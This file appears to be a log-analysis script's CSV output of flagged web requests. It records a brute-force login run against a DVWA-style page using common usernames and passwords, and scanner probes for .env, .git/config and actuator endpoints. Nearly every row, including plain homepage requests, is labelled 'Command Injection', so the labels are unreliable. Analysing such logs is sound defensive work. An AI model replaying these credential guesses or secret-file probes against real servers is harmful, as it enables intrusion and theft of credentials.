access.log.1,Command Injection,05/Apr/2024:15:58:17 +0000,/vulnerabilities/brute/?username=test&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:18 +0000,/vulnerabilities/brute/?username=guest&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:18 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:19 +0000,/vulnerabilities/brute/?username=info&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:19 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:19 +0000,/vulnerabilities/brute/?username=adm&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:20 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:21 +0000,/vulnerabilities/brute/?username=mysql&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:21 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:21 +0000,/vulnerabilities/brute/?username=user&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:22 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:22 +0000,/vulnerabilities/brute/?username=administrator&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:22 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:23 +0000,/vulnerabilities/brute/?username=oracle&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:23 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:23 +0000,/vulnerabilities/brute/?username=ftp&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:24 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:24 +0000,/vulnerabilities/brute/?username=pi&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:24 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:25 +0000,/vulnerabilities/brute/?username=puppet&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:25 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:25 +0000,/vulnerabilities/brute/?username=ansible&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:26 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:26 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:26 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:27 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:27 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:27 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=princess&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:28 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:28 +0000,/vulnerabilities/brute/?username=root&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:28 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:29 +0000,/vulnerabilities/brute/?username=admin&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:29 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:29 +0000,/vulnerabilities/brute/?username=test&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:30 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:30 +0000,/vulnerabilities/brute/?username=guest&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:30 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:31 +0000,/vulnerabilities/brute/?username=info&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:31 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:31 +0000,/vulnerabilities/brute/?username=adm&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:32 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:32 +0000,/vulnerabilities/brute/?username=mysql&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:32 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:33 +0000,/vulnerabilities/brute/?username=user&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:33 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:33 +0000,/vulnerabilities/brute/?username=administrator&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:34 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:34 +0000,/vulnerabilities/brute/?username=oracle&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:34 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:35 +0000,/vulnerabilities/brute/?username=ftp&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:35 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:35 +0000,/vulnerabilities/brute/?username=pi&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:36 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:36 +0000,/vulnerabilities/brute/?username=puppet&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:36 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:37 +0000,/vulnerabilities/brute/?username=ansible&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:37 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:37 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:38 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:38 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:38 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:39 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=1234567&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:39 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:39 +0000,/vulnerabilities/brute/?username=root&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:40 +0000,/vulnerabilities/brute/?username=admin&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:40 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:41 +0000,/vulnerabilities/brute/?username=test&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:41 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:41 +0000,/vulnerabilities/brute/?username=guest&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:42 +0000,/vulnerabilities/brute/?username=info&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:42 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:43 +0000,/vulnerabilities/brute/?username=adm&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:43 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:43 +0000,/vulnerabilities/brute/?username=mysql&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:44 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:44 +0000,/vulnerabilities/brute/?username=user&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:44 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:45 +0000,/vulnerabilities/brute/?username=administrator&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:45 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:45 +0000,/vulnerabilities/brute/?username=oracle&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:46 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:46 +0000,/vulnerabilities/brute/?username=ftp&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:46 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:47 +0000,/vulnerabilities/brute/?username=pi&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:47 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:47 +0000,/vulnerabilities/brute/?username=puppet&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:48 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:48 +0000,/vulnerabilities/brute/?username=ansible&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:48 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:49 +0000,/vulnerabilities/brute/?username=ec2-user&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:49 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:49 +0000,/vulnerabilities/brute/?username=vagrant&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:50 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:50 +0000,/vulnerabilities/brute/?username=azureuser&amp;password=rockyou&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:50 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:51 +0000,/vulnerabilities/brute/?username=root&amp;password=12345678&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:51 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:51 +0000,/vulnerabilities/brute/?username=admin&amp;password=12345678&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:52 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:52 +0000,/vulnerabilities/brute/?username=test&amp;password=12345678&amp;user_token=&amp;Login=Login,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:15:58:52 +0000,/vulnerabilities/brute/,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:15:59:14 +0000,/.env,78.153.140.179,-
access.log.1,Command Injection,05/Apr/2024:15:59:14 +0000,/.env,78.153.140.179,-
access.log.1,Command Injection,05/Apr/2024:15:59:14 +0000,-,78.153.140.179,-
access.log.1,Command Injection,05/Apr/2024:16:00:38 +0000,/log_analysis_report.html,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:39 +0000,/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:39 +0000,/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:39 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:39 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:40 +0000,/log_analysis_report.html,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:40 +0000,/sd,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:40 +0000,/sd,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:00:40 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Command Injection,05/Apr/2024:16:00:40 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log.1,Error Codes,05/Apr/2024:16:03:41 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:16:03:41 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:16:03:42 +0000,/,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:16:09:40 +0000,/,172.104.11.51,-
access.log.1,Command Injection,05/Apr/2024:16:13:24 +0000,/,45.79.181.104,-
access.log.1,Command Injection,05/Apr/2024:16:26:34 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:16:38:05 +0000,/,45.79.181.251,-
access.log.1,Unusual Request Methods,05/Apr/2024:17:15:06 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:17:15:06 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:17:28:19 +0000,/,185.224.128.43,-
access.log.1,Unusual Request Methods,05/Apr/2024:17:56:36 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:17:56:36 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:18:11:25 +0000,/,192.155.88.231,-
access.log.1,Command Injection,05/Apr/2024:18:28:33 +0000,-,45.79.181.223,-
access.log.1,Command Injection,05/Apr/2024:18:34:43 +0000,/,45.79.128.205,-
access.log.1,Command Injection,05/Apr/2024:18:41:27 +0000,/,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:31 +0000,/,206.168.34.38,-
access.log.1,Error Codes,05/Apr/2024:18:41:31 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:31 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:35 +0000,/login.php,206.168.34.38,-
access.log.1,Error Codes,05/Apr/2024:18:41:35 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:35 +0000,*,206.168.34.38,-
access.log.1,Command Injection,05/Apr/2024:18:41:35 +0000,/favicon.ico,206.168.34.38,-
access.log.1,Error Codes,05/Apr/2024:18:41:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:18:41:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:18:41:53 +0000,/,54.37.79.75,-
access.log.1,Error Codes,05/Apr/2024:18:42:26 +0000,/.git/config,91.92.255.41,-
access.log.1,Command Injection,05/Apr/2024:18:42:26 +0000,/.git/config,91.92.255.41,-
access.log.1,Error Codes,05/Apr/2024:18:53:52 +0000,/.env,188.93.233.146,-
access.log.1,Command Injection,05/Apr/2024:18:53:52 +0000,/.env,188.93.233.146,-
access.log.1,Command Injection,05/Apr/2024:18:53:53 +0000,/,188.93.233.146,-
access.log.1,Command Injection,05/Apr/2024:18:56:27 +0000,/,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:32 +0000,/,167.94.138.52,-
access.log.1,Error Codes,05/Apr/2024:18:56:32 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:32 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:35 +0000,/login.php,167.94.138.52,-
access.log.1,Error Codes,05/Apr/2024:18:56:35 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:35 +0000,*,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:18:56:35 +0000,/favicon.ico,167.94.138.52,-
access.log.1,Command Injection,05/Apr/2024:19:03:46 +0000,/,45.79.181.251,-
access.log.1,Command Injection,05/Apr/2024:19:04:54 +0000,/,45.79.181.251,-
access.log.1,Command Injection,05/Apr/2024:19:19:16 +0000,/,69.164.217.245,-
access.log.1,Command Injection,05/Apr/2024:19:19:35 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:20:20 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:21:05 +0000,/,172.104.11.46,-
access.log.1,Command Injection,05/Apr/2024:19:21:29 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:22:14 +0000,/,45.79.181.179,-
access.log.1,Command Injection,05/Apr/2024:19:22:22 +0000,/,172.104.11.46,-
access.log.1,Command Injection,05/Apr/2024:19:24:53 +0000,/,192.155.90.118,-
access.log.1,Command Injection,05/Apr/2024:19:32:00 +0000,/,192.155.90.118,-
access.log.1,Command Injection,05/Apr/2024:19:33:23 +0000,/,45.79.163.53,-
access.log.1,Command Injection,05/Apr/2024:19:35:59 +0000,/,192.155.90.118,-
access.log.1,Command Injection,05/Apr/2024:19:37:55 +0000,/,172.104.210.105,-
access.log.1,Command Injection,05/Apr/2024:19:38:33 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:19:39:17 +0000,/,45.79.181.179,-
access.log.1,Command Injection,05/Apr/2024:19:39:22 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:19:40:20 +0000,/,192.155.90.220,-
access.log.1,Command Injection,05/Apr/2024:19:41:51 +0000,/,192.155.90.118,-
access.log.1,Error Codes,05/Apr/2024:19:51:44 +0000,/.git/config,52.143.131.119,-
access.log.1,Command Injection,05/Apr/2024:19:51:44 +0000,/.git/config,52.143.131.119,-
access.log.1,Command Injection,05/Apr/2024:19:55:46 +0000,/,45.79.172.21,-
access.log.1,Command Injection,05/Apr/2024:20:13:45 +0000,/,45.79.128.205,-
access.log.1,Command Injection,05/Apr/2024:20:18:00 +0000,/,45.79.181.223,-
access.log.1,Unusual Request Methods,05/Apr/2024:20:26:47 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:20:26:47 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:21:07:58 +0000,/,172.105.128.11,-
access.log.1,Command Injection,05/Apr/2024:21:15:10 +0000,-,193.109.85.36,-
access.log.1,Command Injection,05/Apr/2024:21:17:35 +0000,/,69.164.217.74,-
access.log.1,Command Injection,05/Apr/2024:21:17:57 +0000,/,45.33.80.243,-
access.log.1,Command Injection,05/Apr/2024:21:18:07 +0000,/,172.104.11.4,-
access.log.1,Command Injection,05/Apr/2024:21:29:03 +0000,/,45.79.128.205,-
access.log.1,Command Injection,05/Apr/2024:21:29:25 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:21:36:47 +0000,/?XDEBUG_SESSION_START=phpstorm,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:21:36:48 +0000,/login.php,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:21:54:46 +0000,/,185.224.128.43,-
access.log.1,Command Injection,05/Apr/2024:21:59:02 +0000,/,69.164.217.245,-
access.log.1,Command Injection,05/Apr/2024:21:59:37 +0000,/,172.104.11.4,-
access.log.1,Command Injection,05/Apr/2024:21:59:45 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:22:00:31 +0000,/,66.175.213.4,-
access.log.1,Command Injection,05/Apr/2024:22:01:08 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:22:01:12 +0000,/,45.33.80.243,-
access.log.1,Command Injection,05/Apr/2024:22:01:59 +0000,/,172.105.128.12,-
access.log.1,Command Injection,05/Apr/2024:22:02:38 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:22:02:40 +0000,/,45.33.80.243,-
access.log.1,Command Injection,05/Apr/2024:22:08:39 +0000,/,45.79.128.205,-
access.log.1,Error Codes,05/Apr/2024:22:28:36 +0000,/api/v0/id,198.211.115.238,-
access.log.1,Command Injection,05/Apr/2024:22:28:36 +0000,/api/v0/id,198.211.115.238,-
access.log.1,Error Codes,05/Apr/2024:22:41:09 +0000,/.env,46.238.160.112,-
access.log.1,Command Injection,05/Apr/2024:22:41:09 +0000,/.env,46.238.160.112,-
access.log.1,Error Codes,05/Apr/2024:22:46:11 +0000,/actuator/gateway/routes,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:22:46:11 +0000,/actuator/gateway/routes,83.97.73.245,-
access.log.1,Command Injection,05/Apr/2024:22:47:36 +0000,/,198.235.24.161,-
access.log.1,Command Injection,05/Apr/2024:22:47:37 +0000,/login.php,198.235.24.161,-
access.log.1,Unusual Request Methods,05/Apr/2024:22:49:37 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:22:49:37 +0000,www.google.com:443,80.75.212.75,-
access.log.1,Command Injection,05/Apr/2024:23:01:06 +0000,/log_analysis_report.html,119.74.129.29,-
access.log.1,Error Codes,05/Apr/2024:23:01:07 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:01:07 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log.1,Error Codes,05/Apr/2024:23:01:07 +0000,/sd,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:01:07 +0000,/sd,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:01:58 +0000,-,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:02:13 +0000,-,119.74.129.29,-
access.log.1,Command Injection,05/Apr/2024:23:14:40 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:23:16:09 +0000,/,172.105.128.13,-
access.log.1,Command Injection,05/Apr/2024:23:17:02 +0000,/,172.105.128.13,-
access.log.1,Error Codes,05/Apr/2024:23:22:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:23:22:53 +0000,/.env,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:23:22:54 +0000,/,54.37.79.75,-
access.log.1,Command Injection,05/Apr/2024:23:24:47 +0000,/,185.224.128.43,-
access.log.1,Command Injection,05/Apr/2024:23:26:00 +0000,/,172.105.128.11,-
access.log.1,Command Injection,05/Apr/2024:23:26:54 +0000,/,172.105.128.11,-
access.log.1,Error Codes,05/Apr/2024:23:29:38 +0000,/.env,83.147.54.190,-
access.log.1,Command Injection,05/Apr/2024:23:29:38 +0000,/.env,83.147.54.190,-
access.log.1,Command Injection,05/Apr/2024:23:29:38 +0000,/,83.147.54.190,-
access.log.1,Command Injection,05/Apr/2024:23:33:50 +0000,/,146.19.24.28,-
access.log.1,Command Injection,05/Apr/2024:23:45:35 +0000,/,185.224.128.43,-
access.log.1,Error Codes,05/Apr/2024:23:46:39 +0000,/.git/config,52.143.128.224,-
access.log.1,Command Injection,05/Apr/2024:23:46:39 +0000,/.git/config,52.143.128.224,-
access.log.1,Unusual Request Methods,05/Apr/2024:23:48:35 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:23:48:35 +0000,google.com:443,87.121.69.52,-
access.log.1,Command Injection,05/Apr/2024:23:48:40 +0000,/,69.164.217.74,-
access.log.1,Command Injection,05/Apr/2024:23:48:51 +0000,/,172.104.11.34,-
access.log.1,Command Injection,05/Apr/2024:23:59:49 +0000,/,185.224.128.43,-
